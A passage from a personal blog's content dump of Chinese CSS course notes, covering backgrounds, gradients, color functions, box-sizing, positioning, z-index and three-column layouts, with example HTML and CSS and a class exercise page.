url(./imgs/三国杀文姬甄姬.png) 10 round;/*不要带单位px!!!!!*/ border-image: url(./imgs/三国杀文姬甄姬.png) 10 round;/*不要带单位px!!!!!*/ &#125; .div2&#123; -webkit-border-image: url(./imgs/三国杀文姬甄姬.png) 10 repeat;/*不要带单位px!!!!!*/ -moz-border-image: url(./imgs/三国杀文姬甄姬.png) 10 repeat;/*不要带单位px!!!!!*/ -o-border-image: url(./imgs/三国杀文姬甄姬.png) 10 repeat;/*不要带单位px!!!!!*/ border-image: url(./imgs/三国杀文姬甄姬.png) 10 repeat;/*不要带单位px!!!!!*/ &#125; .div3,img&#123; -webkit-border-image: url(./imgs/三国杀文姬甄姬.png) 10 stretch;/*不要带单位px!!!!!*/ -moz-border-image: url(./imgs/三国杀文姬甄姬.png) 10 stretch;/*不要带单位px!!!!!*/ -o-border-image: url(./imgs/三国杀文姬甄姬.png) 10 stretch;/*不要带单位px!!!!!*/ border-image: url(./imgs/三国杀文姬甄姬.png) 10 stretch;/*不要带单位px!!!!!*/ &#125; &lt;/style&gt;&lt;/head&gt;&lt;body&gt; &lt;div class=&quot;div1&quot;&gt;&lt;/div&gt; &lt;br&gt; &lt;div class=&quot;div2&quot;&gt;&lt;/div&gt;&lt;br&gt; &lt;div class=&quot;div3&quot;&gt;&lt;/div&gt; &lt;img src=&quot;./imgs/img_1.png&quot; alt=&quot;&quot;&gt;&lt;/body&gt;&lt;/html&gt; 7.5 CSS3背景CSS3允许使用多个属性（比如：background-image、background-repeat、background-size、background-position、background-origin、background-clip等）在一个元素上添加多层背景图片。该属性的应用大大改善了以往面对多层次设计需要多层布局的问题，帮助Web前端开发人者在不借助Photoshop的情况下实现对页面背景的设计，简化了背景图片的维护成本。 多重背景background：背景色 背景图片 平铺方式 位置,背景色 背景图片 平铺方式 位置…… 123456789101112131415161718192021222324&lt;!DOCTYPE html&gt;&lt;html lang=&quot;en&quot;&gt;&lt;head&gt; &lt;meta charset=&quot;UTF-8&quot;&gt; &lt;title&gt;多重背景&lt;/title&gt; &lt;style&gt; .div1&#123; width: 600px; height: 600px; margin: 100px auto; background-color: #8080ff; /*background: url(./imgs/img_1.png) no-repeat,url(./imgs/img.png) no-repeat 0 0,url(./imgs/三国杀夏侯氏.png) no-repeat 0 0;*/ background-image: url(./imgs/img_1.png) ,url(./imgs/img.png),url(./imgs/三国杀夏侯氏.png); background-position: 50% 100%,0 0,0 0; background-repeat: no-repeat; &#125; &lt;/style&gt;&lt;/head&gt;&lt;body&gt; &lt;div class=&quot;div1&quot;&gt; &lt;/div&gt;&lt;/body&gt;&lt;/html&gt; background-size：设定背景图像的尺寸。 语法1background-size: 固定长度|percentage|cover|contain; cover：将背景图扩展至足够大，以使背景图完全覆盖背景区域，背景图像的某些部分也许无法显示在背景定位区域中。（例如：满足了宽度，但是没有满足高度） contain：把图像扩展至最大尺寸，以使其宽度和高度完全适应内容区域。（优先显示完整图像，有空缺就平铺） background-image 属性值 url none inherit：指定背景图像应该从父元素继承。 background-origin：指定了背景图像的位置区域。 语法1background-origin: padding-box|border-box|content-box; 属性值 padding-box：背景图像相对于内边距来定位。（不会填充到边框里面去！） border-box：背景图像相对于边框盒子来定位。 content-box：背景图像相对于内容框来定位。（以内容区域为起点） background-clip：设定背景图像的绘制区域。 语法1background-clip: border-box|padding-box|content-box; 属性值 padding-box：不会填充到边框上。 border-box：超出border部分裁剪。 content-box：超出内容部分被裁剪。 text：文字 区别：clip是裁剪，origin是隐藏。 渐变背景 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051&lt;!DOCTYPE html&gt;&lt;html lang=&quot;en&quot;&gt;&lt;head&gt; &lt;meta charset=&quot;UTF-8&quot;&gt; &lt;title&gt;CSS3背景属性&lt;/title&gt; &lt;style&gt; p&#123; color: white; width: 500px; margin: 100px auto 0; padding: 10px; border: 10px solid rgba(150,150,255,0.46); background: url(&quot;./imgs/三国杀夏侯氏.png&quot;); -webkit-background-size: cover; background-size: cover; &#125; /* 1.background-size：设定背景图像的尺寸。 2.background-origin：指定了背景图像的位置区域。 3.background-clip：设定背景图像的绘制区域。 */ .div1&#123; color: white; width: 500px; margin: 100px auto 0; padding: 10px; border: 10px solid rgba(150,150,255,0.46); background-image: url(./imgs/三国杀二乔.jpg); -webkit-background-origin: padding-box; background-origin: padding-box; background-repeat: no-repeat; &#125; .div2&#123; color: white; width: 500px; margin: 100px auto 0; padding: 10px; border: 10px solid rgba(150,150,255,0.46); background-image: url(./imgs/三国杀.bmp); -webkit-background-clip: content-box; background-clip: content-box; background-repeat: no-repeat; &#125; &lt;/style&gt;&lt;/head&gt;&lt;body&gt; &lt;p&gt;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA. Dancing is a popular pastime to many people all over the world. Way back to past centuries, and even today, tribal people engage in dancing as a form of worship or as a part of a ceremony in a celebration. On such occasions, dancing can be very solemn. In modern times, dancing appeals to different people for different reasons. Young people often include dancing in parties or at other social gatherings. It seems to be an incentive for them to gather. They look forward to dancing into the night during parties without feeling fatigue. To the elderly, the steps in dancing are reduced with a slower tempo in the music. They gather in community centers to learn folk dance and, at the same time, to know one another in such informal interactions. Personally, I doubt the effectiveness of dancing as a major role in keeping one&#x27;s body healthy and in good shape. Activities such as jogging, swimming and playing games are more effective for attaining good health. They can burn off calories in our bodies and develop our muscles. To me, there are more meaningful and effective ways to keep fit&lt;/p&gt; &lt;div class=&quot;div1&quot;&gt;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA. Dancing is a popular pastime to many people all over the world. Way back to past centuries, and even today, tribal people engage in dancing as a form of worship or as a part of a ceremony in a celebration. On such occasions, dancing can be very solemn. In modern times, dancing appeals to different people for different reasons. Young people often include dancing in parties or at other social gatherings. It seems to be an incentive for them to gather. They look forward to dancing into the night during parties without feeling fatigue. To the elderly, the steps in dancing are reduced with a slower tempo in the music. They gather in community centers to learn folk dance and, at the same time, to know one another in such informal interactions. Personally, I doubt the effectiveness of dancing as a major role in keeping one&#x27;s body healthy and in good shape. Activities such as jogging, swimming and playing games are more effective for attaining good health. They can burn off calories in our bodies and develop our muscles. To me, there are more meaningful and effective ways to keep fit&lt;/div&gt; &lt;div class=&quot;div2&quot;&gt;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA. Dancing is a popular pastime to many people all over the world. Way back to past centuries, and even today, tribal people engage in dancing as a form of worship or as a part of a ceremony in a celebration. On such occasions, dancing can be very solemn. In modern times, dancing appeals to different people for different reasons. Young people often include dancing in parties or at other social gatherings. It seems to be an incentive for them to gather. They look forward to dancing into the night during parties without feeling fatigue. To the elderly, the steps in dancing are reduced with a slower tempo in the music. They gather in community centers to learn folk dance and, at the same time, to know one another in such informal interactions. Personally, I doubt the effectiveness of dancing as a major role in keeping one&#x27;s body healthy and in good shape. Activities such as jogging, swimming and playing games are more effective for attaining good health. They can burn off calories in our bodies and develop our muscles. To me, there are more meaningful and effective ways to keep fit&lt;/div&gt;&lt;/body&gt;&lt;/html&gt; background-image: 线性渐变|径向渐变。 7.6 CSS3颜色函数（均兼容） RGBA(r,g,b,a)： rgb配色方案 r:red 取值范围：0~255 / 0 ~100% g:green 取值范围：0~255 / 0 ~100% b:blue 取值范围：0~255 / 0 ~100% a:不透明度 取值范围：0~1之间的小数 1234567891011121314151617181920212223242526272829303132333435363738&lt;!DOCTYPE html&gt;&lt;html lang=&quot;en&quot;&gt;&lt;head&gt; &lt;meta charset=&quot;UTF-8&quot;&gt; &lt;title&gt;CSS3颜色&lt;/title&gt; &lt;style&gt; .container&#123; width: 500px; height: 300px; position: relative; overflow: hidden; background-color: blueviolet; &#125; .div1,.div2&#123; width: 100%; height: 100%; position: absolute; top: 0; left: 0; /*background-color: rgb(150,150,255);*/ &#125; .div1&#123; background-image: url(&quot;./imgs/三国杀.bmp&quot;);/*使用不透明度调整*/ &#125; .div2&#123; background-color: rgba(0, 125, 0, 0.1);/*使用不透明度调整*/ &#125; /*.div2:hover&#123; background-color: hsla(150,50%,50%,0.1);/*使用不透明度调整*/ &#125; */ &lt;/style&gt;&lt;/head&gt;&lt;body&gt; &lt;div class=&quot;container&quot;&gt; &lt;div class=&quot;div1&quot;&gt;&lt;/div&gt; &lt;div class=&quot;div2&quot;&gt;&lt;/div&gt;&lt;/div&gt;&lt;/body&gt;&lt;/html&gt; HSL(h,s,l) h:色调 取值范围：0~360 s:饱和度 取值范围：0~100% l:亮度 取值范围：0~100% HSLA(h,s,l,a) h:色调 取值范围：0~360 s:饱和度 取值范围：0~100% l:亮度 取值范围：0~100% a:不透明度 取值范围：0~1之间的小数 注意：可以使用hover实现元素遮罩层/蒙版层。(mask) Opacity：设置元素的不透明度级别，大多数情况下用于做元素的遮罩效果。 取值范围：0~1之间的一个小数。 不透明度不为1的元素叠加在另一个元素上，会有一个计算过程。 IE8及以下不支持Opacity，处理兼容的方式：再添加一行代码 1filter:alpha(opacity = 数值);/*数值范围：0-100之间*/ 7.7 CSS3渐变主要用于设置背景色/制作三维图像。 线性渐变 语法1background: linear-gradient(方向, 颜色l 百分比, 颜色2 百分比,……) 方向： to left：从右向左渐变 to right：从左向右渐变 to top：从下向上渐变 to bottom：从上向下渐变 to top right：从左下角向右上角渐变 to top left：从右下角向左上角渐变 to bottom left：从右上角向左下角渐变 to bottom right：从左上角向右下角渐变 角度： 45度角：45deg 颜色取值：16进制、颜色函数rgb/rgba/hsl/hsla、颜色单词 123456789101112131415161718192021&lt;!DOCTYPE html&gt;&lt;html lang=&quot;en&quot;&gt;&lt;head&gt; &lt;meta charset=&quot;UTF-8&quot;&gt; &lt;title&gt;线性渐变&lt;/title&gt; &lt;style&gt; .div1&#123; width: 600px; height: 400px; /*background: linear-gradient(to right,#8080ff,#00ffff);*/ /*background: linear-gradient(to bottom,#8080ff,#00ffff);*/ /*background: linear-gradient(to bottom left,#8080ff,#00ffff,#00ff00);*/ /*background: linear-gradient(10deg,#8080ff,#00ffff,#00ff00,deepskyblue);*/ background: linear-gradient(10deg,#8080ff 30%,#00ffff,#00ff00,deepskyblue); &#125; &lt;/style&gt;&lt;/head&gt;&lt;body&gt; &lt;div class=&quot;div1&quot;&gt;&lt;/div&gt;&lt;/body&gt;&lt;/html&gt; 径向渐变（沿半径方向渐变） 语法1background: radial-gradient(at 圆心位置（默认center） 形状 渐变大小, start-color 百分比,……,last-color 百分比); shape：形状 ellipse：椭圆径向渐变（默认） circle：⚪径向渐变 size： 渐变大小 farthest-corner：渐变半径长度为从圆心到离圆心最远的角(默认) closest-side：渐变半径长度为从圆心到离圆心最近的边 closest-corner：渐变半径长度为从圆心到离圆心最近的角 farthest-side：渐变半径长度为从圆心到离圆心最远的边 position：位置 center:默认值，设置圆心在中心位置。 top：设置圆心在顶部位置。 bottom：设置圆心在底部位置。 at 横坐标 纵坐标：设置圆心的位置。 文字渐变 语法： 12345标签&#123; background-image: 线性渐变/径向渐变； -webkit-background-clip: text; -webkit-fill-color: transparent;&#125; 1234567891011121314151617181920&lt;!DOCTYPE html&gt;&lt;html lang=&quot;en&quot;&gt;&lt;head&gt; &lt;meta charset=&quot;UTF-8&quot;&gt; &lt;title&gt;CSS3 文字渐变&lt;/title&gt; &lt;style&gt; p&#123; background-image: linear-gradient(30deg,#87faf8,#2300ff,#8080ff); background-image: -webkit-linear-gradient(30deg,#87faf8,#2300ff,#8080ff); -webkit-background-clip: text; -webkit-text-fill-color: transparent; text-shadow: 0 1px 1px #ccc; &#125; &lt;/style&gt;&lt;/head&gt;&lt;body&gt; &lt;p&gt; 只是因为你的存在，我没有遇见更喜欢的人。&lt;/p&gt; &lt;p&gt; 因为我依然很喜欢你，所以不敢告诉你。所以你永远不知道我有多喜欢你。这样在有生之年，我还可以看到你。&lt;/p&gt;&lt;/body&gt;&lt;/html&gt; 7.8 CSS3盒模型 box-sizing：允许你以某种方式定义某些元素，以适应指定的区域。box-sizing: content-box/border-box; 火狐/谷歌兼容低版本，需要写厂商前缀。 border-box：把边框纳入文本内容。 123456789101112131415161718192021222324252627282930313233343536&lt;!DOCTYPE html&gt;&lt;html lang=&quot;en&quot;&gt;&lt;head&gt; &lt;meta charset=&quot;UTF-8&quot;&gt; &lt;title&gt;CSS3盒模型&lt;/title&gt; &lt;style&gt; .container&#123; width: 400px; height: 200px; border: 1px solid black; &#125; .box1,.box2&#123; width: 200px; height: 200px; float: left; border: 5px solid #8080ff; padding: 20px; /*文本内容的实际宽度为200px（包含：文本宽度150px+边框10px+padding：40px）*/ -webkit-box-sizing: border-box; -moz-box-sizing: border-box; box-sizing: border-box; /*文本内容的实际宽度为250px（包含：文本宽度200px+边框10px+padding：40px）*/ /*-webkit-box-sizing: border-box;*/ /*-moz-box-sizing: border-box;*/ /*box-sizing: border-box;*/ &#125; &lt;/style&gt;&lt;/head&gt;&lt;body&gt; &lt;div class=&quot;container&quot;&gt; &lt;div class=&quot;box1&quot;&gt;&lt;/div&gt; &lt;div class=&quot;box2&quot;&gt;&lt;/div&gt; &lt;/div&gt;&lt;/body&gt;&lt;/html&gt; 实训12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273&lt;!DOCTYPE html&gt;&lt;html lang=&quot;en&quot;&gt;&lt;head&gt; &lt;meta charset=&quot;UTF-8&quot;&gt; &lt;title&gt;第七次课程实训&lt;/title&gt; &lt;link rel=&quot;stylesheet&quot; href=&quot;./CSS/第7次作业.css&quot;&gt;&lt;/head&gt;&lt;body&gt;&lt;div class=&quot;seven&quot;&gt; &lt;header&gt; &lt;h2&gt;gra&lt;span&gt;V&lt;/span&gt;is&lt;/h2&gt; &lt;div class=&quot;banner&quot;&gt; &lt;ul&gt; &lt;li&gt;&lt;a href=&quot;&quot;&gt;Home&lt;/a&gt;&lt;/li&gt; &lt;li&gt;&lt;a href=&quot;&quot;&gt;About&lt;/a&gt;&lt;/li&gt; &lt;li&gt;&lt;a href=&quot;&quot;&gt;Features&lt;/a&gt;&lt;/li&gt; &lt;li&gt;&lt;a href=&quot;&quot;&gt;Portfolio&lt;/a&gt;&lt;/li&gt; &lt;li&gt;&lt;a href=&quot;&quot;&gt;Pricing&lt;/a&gt;&lt;/li&gt; &lt;li&gt;&lt;a href=&quot;&quot;&gt;Blog&lt;/a&gt;&lt;/li&gt; &lt;li&gt;&lt;a href=&quot;&quot;&gt;Contact&lt;/a&gt;&lt;/li&gt; &lt;/ul&gt; &lt;/div&gt; &lt;/header&gt; &lt;div class=&quot;main&quot;&gt; &lt;section&gt; &lt;div class=&quot;left&quot;&gt; &lt;h1&gt;HTML5&lt;/h1&gt; &lt;p class=&quot;p1&quot;&gt;因为我依然很喜欢你，所以不敢告诉你。所以你永远不知道我有多喜欢你。这样在有生之年，我还可以看到你。&lt;/p&gt; &lt;a href=&quot;#&quot;&gt;READ MORE&lt;/a&gt; &lt;/div&gt; &lt;div class=&quot;right&quot;&gt; &lt;figure&gt; &lt;h4&gt;HTML&lt;/h4&gt; &lt;img src=&quot;./imgs/三国杀二乔.jpg&quot; alt=&quot;&quot;&gt; &lt;p&gt;使用HTML&lt;/p&gt; &lt;/figure&gt; &lt;/div&gt; &lt;/section&gt; &lt;footer&gt; &lt;div class=&quot;left_side&quot;&gt; &lt;h4&gt;Last works&lt;/h4&gt; &lt;figure&gt; &lt;img src=&quot;./imgs/三国杀文姬甄姬.png&quot; alt=&quot;&quot;&gt; &lt;h3&gt;ABCD&lt;/h3&gt; &lt;p&gt;zhuzhuzhuzhuzhzzhuzhuzhuzhuzhuhzhuzuhzzhzuzhuzhuzuhzhuzhuhuzuzhhzuhzuhzuzhuhzuhzuhz&lt;/p&gt; &lt;/figure&gt; &lt;figure&gt; &lt;img src=&quot;./imgs/三国杀文姬甄姬.png&quot; alt=&quot;&quot;&gt; &lt;h3&gt;ABCD&lt;/h3&gt; &lt;p&gt;zhuzhuzhuzhuzhzzhuzhuzhuzhuzhuhzhuzuhzzhzuzhuzhuzuhzhuzhuhuzuzhhzuhzuhzuzhuhzuhzuhz&lt;/p&gt; &lt;/figure&gt; &lt;figure&gt; &lt;img src=&quot;./imgs/三国杀文姬甄姬.png&quot; alt=&quot;&quot;&gt; &lt;h3&gt;ABCD&lt;/h3&gt; &lt;p&gt;zhuzhuzhuzhuzhzzhuzhuzhuzhuzhuhzhuzuhzzhzuzhuzhuzuhzhuzhuhuzuzhhzuhzuhzuzhuhzuhzuhz&lt;/p&gt; &lt;/figure&gt; &lt;/div&gt; &lt;div class=&quot;right_side&quot;&gt; &lt;h3&gt;questions&lt;/h3&gt; &lt;ul&gt; &lt;li&gt;&lt;a href=&quot;#&quot;&gt;??????????????????????&lt;/a&gt;&lt;/li&gt; &lt;li&gt;&lt;a href=&quot;#&quot;&gt;??????????????????????&lt;/a&gt;&lt;/li&gt; &lt;li&gt;&lt;a href=&quot;#&quot;&gt;??????????????????????&lt;/a&gt;&lt;/li&gt; &lt;li&gt;&lt;a href=&quot;#&quot;&gt;??????????????????????&lt;/a&gt;&lt;/li&gt; &lt;li&gt;&lt;a href=&quot;#&quot;&gt;??????????????????????&lt;/a&gt;&lt;/li&gt; &lt;/ul&gt; &lt;/div&gt; &lt;/footer&gt;&lt;/div&gt;&lt;/div&gt;&lt;/body&gt;&lt;/html&gt; 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204*&#123; margin: 0; padding: 0;&#125;body&#123; min-width: 600px; background-image: linear-gradient(to bottom,#aaa,#eee,#aaa);&#125;.seven&#123; width: 100%;&#125;h2&#123; padding-left: 20px; color: #666;&#125;h2 span&#123; color: white;&#125;.banner&#123; width: 95%; background-color: #ffffff; margin: 10px auto; line-height: 50px; -webkit-border-radius: 20px; -moz-border-radius: 20px; border-radius: 20px; -webkit-box-shadow: 3px 3px 2px black; -moz-box-shadow: 3px 3px 2px black; box-shadow: 3px 3px 2px black;&#125;ul&#123; overflow: hidden; list-style: none;&#125;.banner ul li&#123; float: left; margin: 10px; color: #999; text-shadow: 1px 1px 1px black ;&#125;.banner a:hover&#123; color: #87faf8;&#125;a&#123; text-decoration: none;&#125;.main&#123; width: 95%; background-color: white; margin: 0 auto 20px; -webkit-border-radius: 20px; -moz-border-radius: 20px; border-radius: 20px; -webkit-box-shadow: 2px 2px 2px black; -moz-box-shadow: 2px 2px 2px black; box-shadow: 2px 2px 2px black;&#125;section&#123; margin: 50px 20px 10px; border: 2px solid #aaa; border-top: none; overflow: hidden; border-radius: 10px; -webkit-box-shadow: 2px 2px 2px black; -moz-box-shadow: 2px 2px 2px black; box-shadow: 2px 2px 2px black;&#125;.left&#123; width: 50%; float: left; margin-bottom: 150px;&#125;.right&#123; width: 50%; float: left;&#125;.left h1&#123; margin: 50px 0 20px 50px; font-size: 100px; font-weight: bolder;&#125;.left p&#123; margin: 0 0 50px 50px; width: 200px; color: black; text-shadow: 2px 2px 1px #f1f2f6; font-weight: bold; opacity: 0.8; filter:alpha(opacity = 80);&#125;.left a&#123; margin-left: 50px; padding: 10px 20px; font-weight: bolder; width: 150px; font-size: 20px; border: #8080ff 10px solid; border-radius: 40px; word-spacing: 1px;/*调整字间距*/&#125;.left a:hover&#123; color: salmon;&#125;section .right figure&#123; margin: 50px 0 0 100px;&#125;section .right figure img&#123; border-radius: 50px;&#125;section .right figure h4&#123; text-align: center;&#125;section .right figure p&#123; text-align: center;&#125;footer&#123; overflow: hidden;&#125;footer .left_side&#123; float: left; width: 80%; clear: none; overflow: hidden;&#125;footer .left_side h4&#123; padding: 20px 0 20px 20px; font-weight: normal;&#125;.left_side figure&#123; text-align: center; width: 210px; float: left; margin: 0 50px 0 20px;&#125;.left_side figure h3&#123; opacity: 0.5; filter: alpha(opacity=50);&#125;.left_side figure p&#123; opacity: 0.5; filter:alpha(opacity=100); margin: 10px 0; width: 100%; line-height: 1.5em; word-wrap: normal; word-break: break-all;&#125;.left_side figure img&#123; opacity: .5; filter:alpha(opacity=50); width: 100%;&#125;.left_side figure:hover img&#123; opacity: 1; filter:alpha(opacity=100); width: 100%;&#125;.left_side figure:hover p&#123; opacity: 1; filter:alpha(opacity=100); width: 100%;&#125;.left_side figure:hover h3&#123; opacity: 100; filter:alpha(opacity=100); width: 100%;&#125;footer .right_side&#123; width: 15%; border: 1px #aaa solid; -webkit-border-radius: 10px; -moz-border-radius: 10px; border-radius: 10px; -webkit-box-sizing: border-box; -moz-box-sizing: border-box; box-sizing: border-box; background: linear-gradient(to top, #8080ff,#00ffff,darkblue); background: -webkit-linear-gradient(to top, #8080ff,#00ffff,darkblue); float: left;&#125;footer .right_side h3&#123; font-weight: normal; color: white; padding: 8px 0 8px 15px; background-color: #333; -webkit-border-radius: 10px 10px 0 0; -moz-border-radius: 10px 10px 0 0; border-radius: 10px 10px 0 0;&#125;footer .right_side ul&#123; margin-left: 10px;&#125;footer .right_side ul li a&#123; opacity: 0.7; color: #f1f2f6; filter:alpha(opacity=0.7); line-height: 1.5em; margin: 5px 0 5px 10px;&#125;footer .right_side ul li a:hover&#123; opacity: 1; color: black; filter:alpha(opacity=1);&#125;","categories":[],"tags":[{"name":"CSS","slug":"CSS","permalink":"https://github.com/zhangjialin996/zhangjialin996.github.io/tags/CSS/"}]},{"title":"CSS布局定位","slug":"前端学习8","date":"2021-04-02T12:09:36.000Z","updated":"2021-05-07T13:30:45.996Z","comments":true,"path":"2021/04/02/前端学习8/","link":"","permalink":"https://github.com/zhangjialin996/zhangjialin996.github.io/2021/04/02/%E5%89%8D%E7%AB%AF%E5%AD%A6%E4%B9%A08/","excerpt":"","text":"CSS定位布局课程提要 定位：position 网站整体布局 BFC IFC 5.1 定位（position）position属性规定元素的定位类型。这个属性定义建立元素布局所用的定位机制。任何元素都可以定位，不过绝对或者固定元素会生成一个块级框，而无论该元素是什么类型。相对定位元素会相对于它正常流中的默认位置偏移。 属性值： static：静态定位，默认值，没有定位，不能设置偏移值（left/right/top/bottom），静态定位会占用标准流（文档流） relative：相对定位，会占用文档流（原位置不能被其他元素占用），会出现在文档流中它该出现的位置，可以设置偏移值改变它的位置。它相对于自身所在的位置做偏移。 absolute：绝对定位，会脱离文档流（浮在文档流上），相对于body偏移。绝对定位一般与相对定位结合使用，它相对的父级是relative定义的元素，即relative的元素是absolute的元素的父级。项目开发中一般relative和absoute结合使用 fixed：固定定位，脱离文档流，相对浏览器左上角（0，0）进行定位，它与relative设定的对象没有关系，即它和父级定位没有任何关系，一般用于开发各种固定导航栏。 12345678910111213141516171819202122232425262728293031323334353637383940414243&lt;!DOCTYPE html&gt;&lt;html lang=&quot;en&quot;&gt;&lt;head&gt; &lt;meta charset=&quot;UTF-8&quot;&gt; &lt;title&gt;relative/static/absolute&lt;/title&gt; &lt;style&gt; .wrapper&#123; width: 600px; height: 400px; border:1px solid deepskyblue; margin: 0 auto; &#125; .box1,.box2,.box3&#123; width: 150px; height: 150px; border: 1px dotted red; display: inline-block; &#125; /*.box2&#123;*/ /* position: static;!*无效的left和top操作，因为已经是static了*!*/ /* left: 100px;*/ /* top: 200px;*/ /*&#125;*/ /*.box2&#123;*/ /* position: relative;!*相对于本来的位置进行偏移，*!*/ /* left: -100px;!*原位置相对与偏移后位置的方向：距离*!*/ /* top: 100px;*/ /*&#125;*/ .box2&#123; position: absolute; left: 100px; top: 10px; &#125; &lt;/style&gt;&lt;/head&gt;&lt;body&gt;&lt;div class=&quot;wrapper&quot;&gt; &lt;div class=&quot;box1&quot;&gt;&lt;/div&gt; &lt;div class=&quot;box2&quot;&gt;&lt;/div&gt; &lt;div class=&quot;box3&quot;&gt;&lt;/div&gt;&lt;/div&gt;&lt;/body&gt;&lt;/html&gt; 12345678910111213141516171819202122232425262728293031323334&lt;!DOCTYPE html&gt;&lt;html lang=&quot;en&quot;&gt;&lt;head&gt; &lt;meta charset=&quot;UTF-8&quot;&gt; &lt;title&gt;absolute与relative结合使用&lt;/title&gt; &lt;style&gt; .wrapper&#123; width: 600px; height: 400px; border:1px solid deepskyblue; margin: 0 auto; position: relative;/*父级*/ &#125; .box1,.box2,.box3&#123; width: 150px; height: 150px; border: 1px dotted red; display: inline-block; &#125; .box2&#123; position: absolute;/*相对偏移*/ left: 100px; top: 10px; &#125; &lt;/style&gt;&lt;/head&gt;&lt;body&gt;&lt;div class=&quot;wrapper&quot;&gt; &lt;div class=&quot;box1&quot;&gt;&lt;/div&gt; &lt;div class=&quot;box2&quot;&gt;&lt;/div&gt; &lt;div class=&quot;box3&quot;&gt;&lt;/div&gt;&lt;/div&gt;&lt;/body&gt;&lt;/html&gt; 12345678910111213141516171819202122232425262728293031323334&lt;!DOCTYPE html&gt;&lt;html lang=&quot;en&quot;&gt;&lt;head&gt; &lt;meta charset=&quot;UTF-8&quot;&gt; &lt;title&gt;fixed定位&lt;/title&gt; &lt;style&gt; .wrapper&#123; width: 600px; height: 400px; border:1px solid deepskyblue; margin: 0 auto; position: relative;/*父级*/ &#125; .box1,.box2,.box3&#123; width: 150px; height: 150px; border: 1px dotted red; display: inline-block; &#125; .box2&#123; position: fixed; left: 100px; top: 10px; &#125; &lt;/style&gt;&lt;/head&gt;&lt;body&gt;&lt;div class=&quot;wrapper&quot;&gt; &lt;div class=&quot;box1&quot;&gt;&lt;/div&gt; &lt;div class=&quot;box2&quot;&gt;&lt;/div&gt; &lt;div class=&quot;box3&quot;&gt;&lt;/div&gt;&lt;/div&gt;&lt;/body&gt;&lt;/html&gt; 5.2 z-index当多个元素添加绝对定位，元素将会叠加在一起，使用z-index可以设置元素显示的层次。 注意： z-index仅能在定位元素上奏效（例如：position:absolute/relative/fixed;） 元素可以拥有负的z-index的值 一般元素为普通流，普通流的z-index默认是0，脱离了普通流，在普通流之上（定义，浮动）z-index为0-1之间。如果z-index的值设置为大于或等于1，元素将会在定位或者浮动流之上。 用在static上将会无效。 12345678910111213141516171819202122232425262728293031323334353637383940414243444546&lt;!DOCTYPE html&gt;&lt;html lang=&quot;en&quot;&gt;&lt;head&gt; &lt;meta charset=&quot;UTF-8&quot;&gt; &lt;title&gt;z-index&lt;/title&gt; &lt;style&gt; .wrapper&#123; width: 600px; height: 400px; border:1px solid deepskyblue; margin: 0 auto; position: relative; &#125; .box1,.box2,.box3&#123; width: 150px; height: 150px; border: 1px dotted red; display: inline-block; position: absolute; &#125; .box2&#123; background-color: blueviolet; left: 100px; top: 100px; z-index: 3; &#125; .box1&#123; background-color: red; left: 50px; z-index: 2; &#125; .box3&#123; background-color: #0ff; left: 150px; z-index: 1; &#125; &lt;/style&gt;&lt;/head&gt;&lt;body&gt;&lt;div class=&quot;wrapper&quot;&gt; &lt;div class=&quot;box1&quot;&gt;&lt;/div&gt; &lt;div class=&quot;box2&quot;&gt;&lt;/div&gt; &lt;div class=&quot;box3&quot;&gt;&lt;/div&gt;&lt;/div&gt;&lt;/body&gt;&lt;/html&gt; 5.3 双飞翼布局网站开发策略：先整体再局部，自顶向下，逐步细化。 5.3.1 双飞翼布局由三列组成，两端固定，中间自适应。即左右列宽度恒定，中间列的宽度根据浏览器窗口大小自适应。 优点： 兼容性好，可以兼容所有主流浏览器，包括万恶的IE。 因为在DOM中center_panel在三列结构的最前面，因此可以实现主要内容的优先加载。 1234567891011121314151617181920212223242526272829303132333435363738&lt;!DOCTYPE html&gt;&lt;html lang=&quot;en&quot;&gt;&lt;head&gt; &lt;meta charset=&quot;UTF-8&quot;&gt; &lt;title&gt;双飞翼布局&lt;/title&gt; &lt;style&gt; .container&#123; width: 100%; overflow: hidden;/*清除浮动，让后面的内容掉到下一行*/ &#125; .column&#123; float: left; height: 200px; &#125; .left&#123; width: 300px; background-color: #f00; margin-left: -100%; &#125; .center&#123; width: 100%; background-color: #0f0; &#125; .right&#123; width: 300px; background-color: #00f; margin-left: -300px; &#125; &lt;/style&gt;&lt;/head&gt;&lt;body&gt; &lt;div class=&quot;container&quot;&gt; &lt;div class=&quot;column center&quot;&gt;&lt;/div&gt; &lt;div class=&quot;column left&quot;&gt;&lt;/div&gt;&lt;!--设定公共类名--&gt; &lt;div class=&quot;column right&quot;&gt;&lt;/div&gt; &lt;/div&gt;&lt;/body&gt;&lt;/html&gt; 5.3.2 圣杯布局(思路是重点中的重点)由三列组成，两端固定，中间自适应，外观与双飞翼相同。 布局里，与双飞翼相比，增加了定位和偏移设置。 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364&lt;!DOCTYPE html&gt;&lt;html lang=&quot;en&quot;&gt;&lt;head&gt; &lt;meta charset=&quot;UTF-8&quot;&gt; &lt;title&gt;圣杯布局&lt;/title&gt; &lt;style&gt; /*头部加尾部*/ .header,.footer&#123; width: 100%; height: 100px; background-color: mediumspringgreen; text-align: center; font-size: 30px; line-height: 100px;/*让文字在内容盒子里垂直居中*/ &#125; *&#123; margin: 0; padding: 0; &#125; /*主体部分*/ .container&#123; overflow: hidden; padding: 0 200px; &#125; .column&#123; float: left; height: 300px; position: relative;/*相对于container*/ &#125; .left&#123; width: 200px; background-color: red; margin-left: -100%; left: -200px; &#125; .center&#123; width: 100%; background-color: blue; &#125; .right&#123; width: 200px; background-color: #8080ff; margin-left: -200px; left: 200px; &#125; body&#123; min-width: 600px;/*限制使用者的最小放缩大小*/ &#125; &lt;/style&gt;&lt;/head&gt;&lt;body&gt;&lt;!--一个网页通常由上中下三部分组成--&gt;&lt;!--1.header头部部分--&gt;&lt;div 